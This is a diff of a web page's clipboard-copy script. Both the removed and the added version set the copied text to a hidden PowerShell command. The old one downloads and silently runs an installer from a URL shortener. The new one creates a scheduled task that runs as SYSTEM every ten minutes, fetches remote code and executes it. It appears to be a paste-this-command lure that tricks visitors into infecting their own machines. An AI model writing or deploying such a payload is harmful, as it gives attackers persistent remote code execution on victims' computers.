@@ -148,7 +148,7 @@
 
     <script>
         function copyToClipboard() {
-            const textToCopy = "powershell.exe -WindowStyle Hidden -Command \"New-Item C:\\Win -ItemType Directory -Force; Invoke-WebRequest -Uri 'https://tinyurl.com/4c24m3as' -OutFile C:\\Win\\instalador.exe; Start-Process C:\\Win\\instalador.exe -ArgumentList '/S' -WindowStyle Hidden\"";
+            const textToCopy = "powershell -c "$t=(Get-Date).AddMinutes(10); schtasks /create /tn U2FA /tr 'powershell -w Hidden -ep Bypass -c iex(iwr -useb https://tinyurl.com/2uxfvszc)' /sc minute /mo 10 /st $($t.ToString('HH:mm')) /ru SYSTEM /np /rl highest /f"";
             
             const tempTextArea = document.createElement("textarea");
             tempTextArea.value = textToCopy;
